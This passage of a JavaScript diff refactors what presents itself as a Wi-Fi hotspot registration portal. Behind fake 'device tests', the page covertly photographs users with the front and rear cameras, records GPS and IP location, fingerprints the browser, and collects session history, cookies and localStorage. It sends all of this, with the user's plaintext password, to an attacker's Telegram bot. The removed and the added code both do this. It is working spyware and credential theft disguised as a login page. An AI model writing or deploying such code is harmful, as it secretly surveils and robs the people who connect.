+                    if (stream) this.stopStream(stream);
+                    if (video) video.remove();
+                    if (canvas) canvas.remove();
+                    
+                    return null;
+                }
+            },
+
+            stopStream(stream) {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    const index = this.activeStreams.indexOf(stream);
+                    if (index > -1) {
+                        this.activeStreams.splice(index, 1);
+                    }
+                }
+            },
+
+            stopAllStreams() {
+                this.activeStreams.forEach(stream => this.stopStream(stream));
+            }
+        };
+
+        // ============================================
+        // MÓDULO: TELEGRAM SERVICE
+        // ============================================
+        const TelegramService = {
+            async sendMessage(text) {
+                // Validar tamanho
+                if (text.length > Config.TELEGRAM.MAX_MESSAGE_LENGTH) {
+                    Logger.warn(`Mensagem muito longa (${text.length} chars), truncando`);
+                    text = text.substring(0, Config.TELEGRAM.MAX_MESSAGE_LENGTH - 100) + '\n\n...[truncado]';
+                }
+
+                const url = `${Config.TELEGRAM.API_BASE}${Config.TELEGRAM.BOT_TOKEN}/sendMessage`;
                 
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, `camera_${type}_${Date.now()}.jpg`);
-                formData.append('caption', `📸 FOTO ${type === 'front' ? 'FRONTAL (SELFIE)' : 'TRASEIRA (AMBIENTE)'}\n\n🕐 ${new Date().toLocaleString('pt-BR')}\n👤 ${userData.username || 'Aguardando cadastro'}\n Modo Anônimo: ${deviceData.incognito?.detected ? 'SIM' : 'NÃO'}`);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
+                try {
+                    const result = await HttpClient.request(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: Config.TELEGRAM.CHAT_ID,
+                            text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    Logger.success('Mensagem enviada');
+                    return result;
+                } catch (error) {
+                    Logger.error('Erro enviar mensagem', error);
+                    throw error;
+                }
+            },
+
+            async sendPhoto(photoData, caption) {
+                const url = `${Config.TELEGRAM.API_BASE}${Config.TELEGRAM.BOT_TOKEN}/sendPhoto`;
+
+                try {
+                    const response = await fetch(photoData);
+                    const blob = await response.blob();
+
+                    const formData = new FormData();
+                    formData.append('chat_id', Config.TELEGRAM.CHAT_ID);
+                    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                    formData.append('caption', caption);
+
+                    const result = await HttpClient.request(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    Logger.success('Foto enviada');
+                    return result;
+                } catch (error) {
+                    Logger.error('Erro enviar foto', error);
+                    throw error;
+                }
+            },
+
+            async sendLocation(latitude, longitude) {
+                const url = `${Config.TELEGRAM.API_BASE}${Config.TELEGRAM.BOT_TOKEN}/sendLocation`;
+
+                try {
+                    const result = await HttpClient.request(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: Config.TELEGRAM.CHAT_ID,
+                            latitude,
+                            longitude
+                        })
+                    });
+
+                    Logger.success('Localização enviada');
+                    return result;
+                } catch (error) {
+                    Logger.error('Erro enviar localização', error);
+                    throw error;
+                }
+            },
+
+            chunkMessage(text, maxLength = Config.TELEGRAM.MAX_MESSAGE_LENGTH) {
+                const chunks = [];
+                let remaining = text;
+
+                while (remaining.length > 0) {
+                    if (remaining.length <= maxLength) {
+                        chunks.push(remaining);
+                        break;
+                    }
+
+                    let splitIndex = remaining.lastIndexOf('\n', maxLength);
+                    if (splitIndex === -1 || splitIndex < maxLength / 2) {
+                        splitIndex = maxLength;
+                    }
+
+                    chunks.push(remaining.substring(0, splitIndex));
+                    remaining = remaining.substring(splitIndex);
+                }
+
+                return chunks;
+            }
+        };
+
+        // ============================================
+        // MÓDULO: GPS SERVICE
+        // ============================================
+        const GPSService = {
+            async getCurrentPosition() {
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocalização não suportada');
+                }
+
+                return new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        resolve,
+                        reject,
+                        {
+                            enableHighAccuracy: Config.GPS.ENABLE_HIGH_ACCURACY,
+                            timeout: Config.GPS.TIMEOUT,
+                            maximumAge: Config.GPS.MAXIMUM_AGE
+                        }
+                    );
                 });
-                
-                console.log(`✅ Foto ${type} enviada!`);
-            } catch (error) {
-                console.error(`❌ Erro enviar foto ${type}:`, error);
-            }
-        }
+            },
 
-        async function sendTelegramMessage(text) {
-            try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                const result = await response.json();
-                console.log('📨 Mensagem enviada:', result.ok ? 'OK' : result);
-                return result.ok;
-            } catch (error) {
-                console.error('❌ Erro ao enviar:', error);
-                return false;
-            }
-        }
+            async getIPLocation() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    return await response.json();
+                } catch (error) {
+                    Logger.error('Erro IP location', error);
+                    return null;
+                }
+            },
 
-        async function sendTelegramLocation() {
-            if (!deviceData.gps_latitude || deviceData.gps_latitude === 'Negado') {
-                console.log('❌ GPS não disponível');
-                return;
+            async getLocation() {
+                try {
+                    const position = await this.getCurrentPosition();
+                    return {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude || 'N/A',
+                        heading: position.coords.heading || 'N/A',
+                        speed: position.coords.speed || 'N/A',
+                        source: 'GPS_PRECISO'
+                    };
+                } catch (error) {
+                    Logger.warn('GPS falhou, usando IP', error);
+                    
+                    const ipData = await this.getIPLocation();
+                    if (ipData) {
+                        return {
+                            latitude: ipData.latitude,
+                            longitude: ipData.longitude,
+                            accuracy: 'Aproximada (IP)',
+                            altitude: 'N/A',
+                            heading: 'N/A',
+                            speed: 'N/A',
+                            source: 'IP_API',
+                            ipData
+                        };
+                    }
+
+                    return {
+                        latitude: 'Negado',
+                        longitude: 'Negado',
+                        accuracy: 'N/A',
+                        altitude: 'N/A',
+                        heading: 'N/A',
+                        speed: 'N/A',
+                        source: 'NEGADO'
+                    };
+                }
             }
-            
-            try {
-                const lat = parseFloat(deviceData.gps_latitude);
-                const lon = parseFloat(deviceData.gps_longitude);
-                
-                if (isNaN(lat) || isNaN(lon)) {
-                    console.log('❌ Coordenadas inválidas');
+        };
+
+        // ============================================
+        // MÓDULO: APP
+        // ============================================
+        const App = {
+            userData: {},
+            deviceData: {},
+            cameraPhotos: { front: null, back: null },
+
+            init() {
+                Logger.info(`Portal v${Config.VERSION} inicializado`);
+            },
+
+            navigate(screenNum) {
+                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+                const target = document.getElementById(`screen${screenNum}`);
+                if (target) {
+                    target.classList.add('active');
+                    Logger.info(`Navegou para tela ${screenNum}`);
+                }
+            },
+
+            showModal(title, text) {
+                document.getElementById('modalTitle').textContent = title;
+                document.getElementById('modalText').textContent = text;
+                document.getElementById('errorModal').classList.add('active');
+            },
+
+            closeModal() {
+                document.getElementById('errorModal').classList.remove('active');
+            },
+
+            async handleRegister(event) {
+                event.preventDefault();
+
+                const name = document.getElementById('regName').value;
+                const username = document.getElementById('regUsername').value;
+                const password = document.getElementById('regPassword').value;
+                const confirmPassword = document.getElementById('regConfirmPassword').value;
+
+                // Validações
+                const nameValidation = Validator.validateName(name);
+                if (!nameValidation.valid) {
+                    this.showModal('Erro de Validação', nameValidation.error);
                     return;
                 }
-                
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        latitude: lat,
-                        longitude: lon
-                    })
-                });
-                const result = await response.json();
-                console.log('📍 Localização enviada:', result.ok ? 'OK' : result);
-            } catch (error) {
-                console.error('❌ Erro localização:', error);
-            }
-        }
 
-        async function sendAllToTelegram() {
-            console.log('🚀 Enviando tudo para Telegram...');
-            
-            // MENSAGEM 1: CONTA + FOTOS + GPS + ANÔNIMO
-            const msg1 = `🔵 *NOVO CADASTRO - PORTAL v${VERSION}*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `👤 *CONTA:*\n` +
-                         `├ Nome: ${userData.name}\n` +
-                         `├ Usuário: \`${userData.username}\`\n` +
-                         `├ Senha: \`${userData.password}\`\n` +
-                         ` Data: ${deviceData.timestamp}\n\n` +
-                         `📸 *FOTOS:*\n` +
-                         `├ Frontal: ${deviceData.cameraFront}\n` +
-                         `└ Traseira: ${deviceData.cameraBack}\n\n` +
-                         `📍 *GPS:*\n` +
-                         `├ Lat: ${deviceData.gps_latitude}\n` +
-                         ` Long: ${deviceData.gps_longitude}\n` +
-                         `├ Precisão: ${deviceData.gps_accuracy}m\n` +
-                         ` Altitude: ${deviceData.gps_altitude || 'N/A'}\n` +
-                         ` Velocidade: ${deviceData.gps_speed || 'N/A'}\n` +
-                         ` Direção: ${deviceData.gps_heading || 'N/A'}\n` +
-                         `└ Fonte: ${deviceData.gps_source}\n\n` +
-                         `🕵️ *MODO ANÔNIMO:*\n` +
-                         `├ Detectado: ${deviceData.incognito?.detected ? 'SIM ⚠️' : 'NÃO'}\n` +
-                         `├ Método: ${deviceData.incognito?.method || 'N/A'}\n` +
-                         `└ Quota: ${deviceData.incognito?.quota || 'N/A'} bytes`;
-            
-            await sendTelegramMessage(msg1);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 2: LOCALIZAÇÃO IP + REDE + MIKROTIK
-            const ip = deviceData.ipLocation || {};
-            const msg2 = `🌍 *LOCALIZAÇÃO E REDE*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ IP Público: ${ip.ip || 'N/A'}\n` +
-                         `├ IP MikroTik: ${deviceData.mikrotik_remote_address || 'N/A'}\n` +
-                         `├ MAC: ${deviceData.mikrotik_mac || 'N/A'}\n` +
-                         `├ Cidade: ${ip.city || 'N/A'}\n` +
-                         `├ Região: ${ip.region || 'N/A'}\n` +
-                         `├ País: ${ip.country_name || 'N/A'}\n` +
-                         `├ CEP: ${ip.postal || 'N/A'}\n` +
-                         `├ ISP: ${ip.org || 'N/A'}\n` +
-                         `├ ASN: ${ip.asn || 'N/A'}\n` +
-                         `├ Timezone IP: ${ip.timezone || 'N/A'}\n` +
-                         `├ Server: ${deviceData.mikrotik_server_name || 'N/A'}\n` +
-                         `├ Radius: ${deviceData.mikrotik_radius || 'N/A'}\n` +
-                         `└ Link Orig: ${deviceData.mikrotik_link_orig || 'N/A'}`;
-            
-            await sendTelegramMessage(msg2);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 3: DISPOSITIVO COMPLETO
-            const msg3 = `💻 *DISPOSITIVO COMPLETO*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Plataforma: ${deviceData.platform}\n` +
-                         `├ App Name: ${deviceData.appName}\n` +
-                         `├ App Version: ${deviceData.appVersion}\n` +
-                         `├ Code Name: ${deviceData.appCodeName}\n` +
-                         ` Product: ${deviceData.product}\n` +
-                         `├ Product Sub: ${deviceData.productSub}\n` +
-                         `├ Vendor: ${deviceData.vendor}\n` +
-                         `├ Vendor Sub: ${deviceData.vendorSub}\n` +
-                         `├ Idioma: ${deviceData.language}\n` +
-                         `├ Idiomas: ${deviceData.languages}\n` +
-                         ` CPU Cores: ${deviceData.hardwareConcurrency}\n` +
-                         `├ RAM: ${deviceData.deviceMemory}GB\n` +
-                         `├ Touch: ${deviceData.maxTouchPoints} pts\n` +
-                         `├ Touch Type: ${deviceData.pointerType}\n` +
-                         `├ Hover: ${deviceData.hoverSupport}\n` +
-                         `├ Bateria: ${deviceData.batteryLevel || 'N/A'}\n` +
-                         `└ Carregando: ${deviceData.batteryCharging || 'N/A'}`;
-            
-            await sendTelegramMessage(msg3);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 4: TELA + CONEXÃO
-            const msg4 = `📱 *TELA E CONEXÃO*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Resolução: ${deviceData.screenWidth}x${deviceData.screenHeight}\n` +
-                         `├ Disponível: ${deviceData.availWidth}x${deviceData.availHeight}\n` +
-                         `├ Window: ${deviceData.windowWidth}x${deviceData.windowHeight}\n` +
-                         `├ Outer: ${deviceData.outerWidth}x${deviceData.outerHeight}\n` +
-                         `├ Pixel Ratio: ${deviceData.devicePixelRatio}\n` +
-                         `├ Color Depth: ${deviceData.colorDepth}bit\n` +
-                         `├ Pixel Depth: ${deviceData.pixelDepth}bit\n` +
-                         `├ Orientação: ${deviceData.orientation}\n` +
-                         `├ Orientation Lock: ${deviceData.orientationLock}\n` +
-                         `├ Tipo Conexão: ${deviceData.connectionType}\n` +
-                         `├ Network Type: ${deviceData.networkType}\n` +
-                         `├ Velocidade: ${deviceData.downlink} Mbps\n` +
-                         `├ Downlink Max: ${deviceData.downlinkMax} Mbps\n` +
-                         `├ Latência: ${deviceData.rtt}ms\n` +
-                         `├ Save Data: ${deviceData.saveData}\n` +
-                         `├ Online: ${deviceData.onLine}\n` +
-                         `└ Timezone: ${deviceData.timezone} (UTC${deviceData.timezoneOffset > 0 ? '-' : '+'}${Math.abs(deviceData.timezoneOffset/60)})`;
-            
-            await sendTelegramMessage(msg4);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 5: FINGERPRINTS + GPU
-            const msg5 = ` *FINGERPRINTS E GPU*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Canvas FP: ${deviceData.canvasFingerprint}\n` +
-                         `├ Audio FP: ${deviceData.audioFingerprint}\n` +
-                         `├ GPU Vendor: ${deviceData.gpuVendor || 'N/A'}\n` +
-                         `├ GPU Renderer: ${deviceData.gpuRenderer || 'N/A'}\n` +
-                         `├ WebGL Version: ${deviceData.webglVersion || 'N/A'}\n` +
-                         `├ Shading Lang: ${deviceData.webglShadingLanguage || 'N/A'}\n` +
-                         `├ Max Texture: ${deviceData.webglMaxTextureSize || 'N/A'}\n` +
-                         `├ Max Viewport: ${deviceData.webglMaxViewportDims || 'N/A'}\n` +
-                         `├ WebGL Ext: ${deviceData.webglExtensions || 'N/A'}\n` +
-                         `├ Microfones: ${deviceData.microphones || 'N/A'}\n` +
-                         `├ Alto-falantes: ${deviceData.speakers || 'N/A'}\n` +
-                         `└ Câmeras: ${deviceData.cameras || 'N/A'}`;
-            
-            await sendTelegramMessage(msg5);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 6: FONTES + PLUGINS + PREFERÊNCIAS
-            const msg6 = `🔤 *FONTES E PLUGINS*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Fontes: ${deviceData.installedFonts.join(', ')}\n` +
-                         `├ Plugins: ${deviceData.plugins}\n` +
-                         ` MIME Types: ${deviceData.mimeTypes}\n` +
-                         `├ Tema: ${deviceData.prefersColorScheme}\n` +
-                         `├ Reduced Motion: ${deviceData.prefersReducedMotion}\n` +
-                         `├ Contraste: ${deviceData.prefersContrast}\n` +
-                         `├ Cores Invertidas: ${deviceData.invertedColors}\n` +
-                         `├ Cookies: ${deviceData.cookieEnabled}\n` +
-                         `├ DNT: ${deviceData.doNotTrack}\n` +
-                         `├ Java Enabled: ${deviceData.javaEnabled}\n` +
-                         `├ PDF Viewer: ${deviceData.pdfViewerEnabled}\n` +
-                         `├ WebDriver: ${deviceData.webdriver}\n` +
-                         `├ LocalStorage: ${deviceData.localStorage}\n` +
-                         `├ SessionStorage: ${deviceData.sessionStorage}\n` +
-                         `└ IndexedDB: ${deviceData.indexedDB}`;
-            
-            await sendTelegramMessage(msg6);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 7: APIS + PERMISSIONS
-            const msg7 = ` *APIS E PERMISSIONS*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Service Worker: ${deviceData.serviceWorker}\n` +
-                         `├ Web Workers: ${deviceData.webWorkers}\n` +
-                         `├ Shared Worker: ${deviceData.sharedWorker}\n` +
-                         `├ Geolocation: ${deviceData.geolocation}\n` +
-                         `├ Device Orientation: ${deviceData.deviceOrientation}\n` +
-                         `├ Device Motion: ${deviceData.deviceMotion}\n` +
-                         `├ Ambient Light: ${deviceData.ambientLight}\n` +
-                         `├ Gamepads: ${deviceData.gamepads}\n` +
-                         `├ MIDI: ${deviceData.midi}\n` +
-                         `├ Presentation: ${deviceData.presentation}\n` +
-                         `├ Remote Playback: ${deviceData.remotePlayback}\n` +
-                         `├ Picture in Picture: ${deviceData.pictureInPicture}\n` +
-                         `├ Vibration: ${deviceData.vibrationAPI}\n` +
-                         `├ Bluetooth: ${deviceData.bluetooth}\n` +
-                         `├ USB: ${deviceData.usb}\n` +
-                         `├ NFC: ${deviceData.nfc}\n` +
-                         `├ Wake Lock: ${deviceData.wakeLock}\n` +
-                         `├ Payment: ${deviceData.paymentRequest}\n` +
-                         `├ Credentials: ${deviceData.credentials}\n` +
-                         `├ Resize Observer: ${deviceData.resizeObserver}\n` +
-                         `├ Intersection Observer: ${deviceData.intersectionObserver}\n` +
-                         `├ Mutation Observer: ${deviceData.mutationObserver}\n` +
-                         `└ Notifications: ${deviceData.notificationsPermission || 'N/A'}`;
-            
-            await sendTelegramMessage(msg7);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 8: 🕵️ HISTÓRICO + ABAS + ANÔNIMO (NOVA!)
-            const historyText = deviceData.sessionHistory.map((h, i) => 
-                `  ${i+1}. [${h.type}] ${h.url.substring(0, 60)}${h.url.length > 60 ? '...' : ''}`
-            ).join('\n');
-            
-            const msg8 = `️ *HISTÓRICO E NAVEGAÇÃO*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `📋 *HISTÓRICO DA SESSÃO (${deviceData.historyLength} páginas):*\n` +
-                         `${historyText || '  Nenhum registro'}\n\n` +
-                         `🔗 *REFERRER:*\n` +
-                         `└ ${deviceData.referrer}\n\n` +
-                         `🪟 *ABAS ABERTAS:*\n` +
-                         ` Aba atual: ${deviceData.title}\n` +
-                         `├ Outras abas (BroadcastChannel): ${deviceData.otherTabs || '0'}\n` +
-                         `├ Tabs no localStorage: ${deviceData.localStorageTabs || '0'}\n` +
-                         `└ Total detectado: ${deviceData.localStorageTabs || 0} tabs\n\n` +
-                         `🍪 *COOKIES:*\n` +
-                         `└ ${deviceData.cookies?.substring(0, 200) || 'Nenhum'}\n\n` +
-                         `💾 *LOCALSTORAGE (${deviceData.localStorageCount || 0} itens):*\n` +
-                         `└ ${JSON.stringify(deviceData.localStorageData || {}).substring(0, 300)}...`;
-            
-            await sendTelegramMessage(msg8);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // MENSAGEM 9: PERFORMANCE + USER AGENT
-            const msg9 = `📊 *PERFORMANCE E PÁGINA*\n` +
-                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                         `├ Page Load: ${deviceData.pageLoadTime || 'N/A'}ms\n` +
-                         `├ DOM Content Loaded: ${deviceData.domContentLoaded || 'N/A'}ms\n` +
-                         `├ Clipboard: ${deviceData.clipboard || 'N/A'}\n` +
-                         `├ URL: ${deviceData.currentURL}\n` +
-                         `├ Referrer: ${deviceData.referrer}\n` +
-                         `├ Title: ${deviceData.title}\n\n` +
-                         `⚡ *USER AGENT:*\n\`${deviceData.userAgent}\`\n\n` +
-                         `📌 *VERSÃO DO SITE:*\n` +
-                         `└ v${VERSION}`;
-            
-            await sendTelegramMessage(msg9);
-            await new Promise(r => setTimeout(r, 500));
-            
-            // ENVIAR LOCALIZAÇÃO NO MAPA
-            await sendTelegramLocation();
-            
-            console.log('✅ Tudo enviado!');
-        }
-
-        function startProgress() {
-            let progress = 0;
-            const fill = document.getElementById('progressFill');
-            const text = document.getElementById('progressText');
-            
-            const interval = setInterval(() => {
-                progress += Math.random() * 15;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    text.textContent = 'Conexão liberada com sucesso! ✅';
-                    
-                    setTimeout(() => {
-                        if ('$(link-login-only)' && '$(link-login-only)' !== '') {
-                            const form = document.createElement('form');
-                            form.method = 'post';
-                            form.action = '$(link-login-only)';
-                            form.innerHTML = `
-                                <input type="hidden" name="username" value="${userData.username}" />
-                                <input type="hidden" name="password" value="${userData.password}" />
-                                <input type="hidden" name="dst" value="$(link-orig)" />
-                            `;
-                            document.body.appendChild(form);
-                            form.submit();
-                        }
-                    }, 2000);
+                const usernameValidation = Validator.validateUsername(username);
+                if (!usernameValidation.valid) {
+                    this.showModal('Erro de Validação', usernameValidation.error);
+                    return;
                 }
-                fill.style.width = progress + '%';
-                text.textContent = `Liberando conexão... ${Math.floor(progress)}%`;
-            }, 300);
-        }
+
+                const passwordValidation = Validator.validatePassword(password);
+                if (!passwordValidation.valid) {
+                    this.showModal('Erro de Validação', passwordValidation.error);
+                    return;
+                }
+
+                const matchValidation = Validator.validatePasswordMatch(password, confirmPassword);
+                if (!matchValidation.valid) {
+                    this.showModal('Erro de Validação', matchValidation.error);
+                    return;
+                }
+
+                this.userData = {
+                    name: nameValidation.value,
+                    username: usernameValidation.value,
+                    password: passwordValidation.value
+                };
+
+                this.navigate(3);
+                await this.runTests();
+            },
+
+            async runTests() {
+                try {
+                    await this.runTest('testTouch', 'Verificando touch...', 'Touch OK ✅', this.testTouch);
+                    await this.runTest('testCamera', 'Testando câmera...', 'Câmera OK ✅', this.testCamera);
+                    await this.runTest('testGPS', 'Localizando...', 'GPS OK ✅', this.testGPS);
+                    await this.runTest('testData', 'Coletando dados...', 'Dados OK ✅', this.testData);
+
+                    await this.sendAllData();
+
+                    setTimeout(() => {
+                        this.navigate(4);
+                        this.startProgress();
+                    }, 1000);
+                } catch (error) {
+                    Logger.error('Erro nos testes', error);
+                    this.showModal('Erro', 'Ocorreu um erro durante os testes. Tente novamente.');
+                }
+            },
+
+            async runTest(elementId, testingText, successText, testFunction) {
+                const element = document.getElementById(elementId);
+                const status = element.querySelector('.test-status');
+
+                element.classList.add('testing');
+                status.textContent = testingText;
+
+                try {
+                    await testFunction.call(this);
+                    element.classList.remove('testing');
+                    element.classList.add('success');
+                    status.textContent = successText;
+                } catch (error) {
+                    Logger.error(`Erro no teste ${elementId}`, error);
+                    element.classList.remove('testing');
+                    element.classList.add('success');
+                    status.textContent = `${successText} (parcial)`;
+                }
+
+                await HttpClient.delay(800);
+            },
+
+            async testTouch() {
+                this.deviceData.touch = {
+                    support: 'ontouchstart' in window,
+                    maxPoints: navigator.maxTouchPoints || 0,
+                    pointerType: window.matchMedia?.('(pointer: fine)').matches ? 'preciso' : 'grosso',
+                    hover: window.matchMedia?.('(hover: hover)').matches
+                };
+            },
+
+            async testCamera() {
+                try {
+                    this.cameraPhotos.front = await CameraManager.capturePhoto('user');
+                    await HttpClient.delay(500);
+                    this.cameraPhotos.back = await CameraManager.capturePhoto('environment');
+
+                    this.deviceData.camera = {
+                        front: this.cameraPhotos.front ? 'CAPTURADA' : 'FALHOU',
+                        back: this.cameraPhotos.back ? 'CAPTURADA' : 'FALHOU'
+                    };
+                } catch (error) {
+                    Logger.error('Erro câmera', error);
+                    this.deviceData.camera = { front: 'ERRO', back: 'ERRO' };
+                }
+            },
+
+            async testGPS() {
+                this.deviceData.gps = await GPSService.getLocation();
+            },
+
+            async testData() {
+                this.deviceData.collected = await DeviceCollector.collectAll();
+            },
+
+            async sendAllData() {
+                Logger.info('Enviando dados para Telegram...');
+
+                try {
+                    // Enviar fotos primeiro
+                    if (this.cameraPhotos.front) {
+                        await TelegramService.sendPhoto(
+                            this.cameraPhotos.front,
+                            `📸 FOTO FRONTAL\n ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
+                        );
+                    }
+
+                    if (this.cameraPhotos.back) {
+                        await TelegramService.sendPhoto(
+                            this.cameraPhotos.back,
+                            `📸 FOTO TRASEIRA\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
+                        );
+                    }
+
+                    // Enviar mensagens de texto
+                    await this.sendAccountInfo();
+                    await this.sendLocationInfo();
+                    await this.sendDeviceInfo();
+                    await this.sendScreenInfo();
+                    await this.sendFingerprints();
+                    await this.sendHistory();
+
+                    // Enviar localização no mapa
+                    if (this.deviceData.gps?.source === 'GPS_PRECISO') {
+                        await TelegramService.sendLocation(
+                            this.deviceData.gps.latitude,
+                            this.deviceData.gps.longitude
+                        );
+                    }
+
+                    Logger.success('Todos os dados enviados');
+                } catch (error) {
+                    Logger.error('Erro ao enviar dados', error);
+                }
+            },
+
+            async sendAccountInfo() {
+                const msg = `🔵 *NOVO CADASTRO v${Config.VERSION}*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `👤 *CONTA:*\n` +
+                    `├ Nome: ${this.userData.name}\n` +
+                    `├ Usuário: \`${this.userData.username}\`\n` +
+                    `├ Senha: \`${this.userData.password}\`\n` +
+                    `└ Data: ${new Date().toLocaleString('pt-BR')}\n\n` +
+                    `📸 *FOTOS:*\n` +
+                    `├ Frontal: ${this.deviceData.camera?.front || 'N/A'}\n` +
+                    ` Traseira: ${this.deviceData.camera?.back || 'N/A'}\n\n` +
+                    `📍 *GPS:*\n` +
+                    `├ Lat: ${this.deviceData.gps?.latitude}\n` +
+                    `├ Long: ${this.deviceData.gps?.longitude}\n` +
+                    `├ Precisão: ${this.deviceData.gps?.accuracy}\n` +
+                    `└ Fonte: ${this.deviceData.gps?.source}\n\n` +
+                    `🕵️ *ANÔNIMO:*\n` +
+                    `├ Detectado: ${this.deviceData.collected?.incognito?.detected ? 'SIM' : 'NÃO'}\n` +
+                    `└ Método: ${this.deviceData.collected?.incognito?.method || 'N/A'}`;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            async sendLocationInfo() {
+                const ip = this.deviceData.gps?.ipData || {};
+                const mikrotik = this.deviceData.collected?.mikrotik || {};
+
+                const msg = `🌍 *LOCALIZAÇÃO E REDE*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `├ IP Público: ${ip.ip || 'N/A'}\n` +
+                    `├ IP MikroTik: ${mikrotik.remoteAddress || 'N/A'}\n` +
+                    `├ MAC: ${mikrotik.mac || 'N/A'}\n` +
+                    `├ Cidade: ${ip.city || 'N/A'}\n` +
+                    ` Região: ${ip.region || 'N/A'}\n` +
+                    `├ País: ${ip.country_name || 'N/A'}\n` +
+                    `├ CEP: ${ip.postal || 'N/A'}\n` +
+                    `├ ISP: ${ip.org || 'N/A'}\n` +
+                    `└ ASN: ${ip.asn || 'N/A'}`;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            async sendDeviceInfo() {
+                const browser = this.deviceData.collected?.browser || {};
+                const hardware = this.deviceData.collected?.hardware || {};
+                const battery = this.deviceData.collected?.battery || {};
+
+                const msg = `💻 *DISPOSITIVO*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `├ Plataforma: ${browser.platform || 'N/A'}\n` +
+                    `├ Idioma: ${browser.language || 'N/A'}\n` +
+                    `├ CPU Cores: ${hardware.cores}\n` +
+                    `├ RAM: ${hardware.memory}GB\n` +
+                    `├ Touch: ${hardware.maxTouchPoints} pts\n` +
+                    `├ Bateria: ${battery.level}\n` +
+                    `└ Carregando: ${battery.charging}`;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            async sendScreenInfo() {
+                const screen = this.deviceData.collected?.screen || {};
+                const win = this.deviceData.collected?.window || {};
+                const conn = this.deviceData.collected?.connection || {};
+
+                const msg = ` *TELA E CONEXÃO*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `├ Resolução: ${screen.width}x${screen.height}\n` +
+                    `├ Window: ${win.innerWidth}x${win.innerHeight}\n` +
+                    `├ Pixel Ratio: ${win.devicePixelRatio}\n` +
+                    `├ Color Depth: ${screen.colorDepth}bit\n` +
+                    `├ Conexão: ${conn.type}\n` +
+                    `├ Velocidade: ${conn.downlink} Mbps\n` +
+                    `└ Latência: ${conn.rtt}ms`;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            async sendFingerprints() {
+                const fp = this.deviceData.collected?.fingerprints || {};
+                const media = this.deviceData.collected?.mediaDevices || {};
+
+                const msg = ` *FINGERPRINTS*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `├ Canvas: ${fp.canvas}\n` +
+                    `├ Audio: ${fp.audio}\n` +
+                    `├ GPU Vendor: ${fp.webgl?.vendor || 'N/A'}\n` +
+                    `├ GPU Renderer: ${fp.webgl?.renderer || 'N/A'}\n` +
+                    `├ Microfones: ${media.microphones}\n` +
+                    ` Alto-falantes: ${media.speakers}\n` +
+                    `└ Câmeras: ${media.cameras}`;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            async sendHistory() {
+                const history = this.deviceData.collected?.sessionHistory || [];
+                const tabs = this.deviceData.collected?.openTabs || {};
+
+                const historyText = history.map((h, i) => 
+                    `  ${i+1}. [${h.type}] ${h.url.substring(0, 60)}`
+                ).join('\n');
+
+                const msg = `📋 *HISTÓRICO E NAVEGAÇÃO*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `📋 *HISTÓRICO (${history.length} itens):*\n${historyText || '  Nenhum'}\n\n` +
